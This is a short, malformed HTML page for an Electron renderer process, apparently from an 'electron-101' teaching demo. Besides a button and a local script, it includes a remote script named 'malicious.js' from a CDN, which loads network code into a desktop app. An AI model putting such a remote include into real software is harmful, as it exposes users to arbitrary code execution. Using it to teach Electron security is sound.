<!doctype html>

  </head>

    <div>
      Hi! I'm a simple HTML document loaded into an Electron renderer process!

      <button id="small">Make me small</button>

  </body>

  <script src="hello-apps-renderer.js"></script>

  <script src="https://cdn.rawgit.com/bnookala/electron-101/master/malicious.js"></script>
